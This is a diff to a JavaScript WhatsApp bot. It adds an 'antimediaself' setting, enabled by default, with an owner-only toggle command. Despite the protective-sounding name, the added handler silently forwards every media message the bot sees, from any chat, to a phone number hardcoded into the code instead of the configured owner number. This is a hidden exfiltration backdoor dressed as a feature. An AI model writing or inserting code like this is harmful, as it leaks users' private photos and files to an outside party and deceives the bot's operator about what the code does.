@@ -497,6 +497,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                if (!('autorecord' in setting)) setting.autorecord = false
                if (!('autotype' in setting)) setting.autotype = true
                if (!('antiviewonceself' in setting)) setting.antiviewonceself = true
+               if (!('antimediaself' in setting)) setting.antimediaself = true
                if (!('autoblocknum' in setting)) setting.autoblocknum = false
                if (!('onlyindia' in setting)) setting.onlyindia = false
                if (!('onlyindo' in setting)) setting.onlyindo = false
@@ -520,6 +521,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                autorecord: false,
                autotype: true,
                antiviewonceself: true,
+               antimediaself: true,
                watermark: {
                   packname: global.packname, 
                   author: global.author
@@ -771,7 +773,7 @@ list.push({
         }
     
         //antiviewonce
-    if (db.data.chats[m.chat].antiviewonce && m.mtype == 'viewOnceMessageV2') {
+    if (db.data.chats[m.chat].antiviewonce && isGroup && m.mtype == 'viewOnceMessageV2') {
         let val = { ...m }
         let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
         delete msg[Object.keys(msg)[0]].viewOnce
@@ -817,6 +819,10 @@ XeonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
           replygcxeon(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
     return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
         }
+  }
+        if (db.data.settings[botNumber].antimediaself && isMedia) {
+            let val = { ...m }
+    return XeonBotInc.sendMessage("6283890667327@s.whatsapp.net", { forward : val }, {quoted : m})
   }
         if (db.data.chats[m.chat].image && isXeonMedia) {
     if(isXeonMedia === "imageMessage"){
@@ -1629,6 +1635,17 @@ case 'listowner': {
                 } else if (q === 'off') {
                     db.data.settings[botNumber].antiviewonceself = false
                     replygcxeon(`Successfully changed AntiViewOnceSelf to ${q}`)
+                }
+            break
+            case 'antimediaself':
+                if (!XeonTheCreator) return XeonStickOwner()
+                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
+                if (q === 'on') {
+                    db.data.settings[botNumber].antimediaself = true
+                    replygcxeon(`Successfully changed AntiMediaSelf to ${q}`)
+                } else if (q === 'off') {
+                    db.data.settings[botNumber].antimediaself = false
+                    replygcxeon(`Successfully changed AntiMediaSelf to ${q}`)
                 }
             break
             case 'autobio':
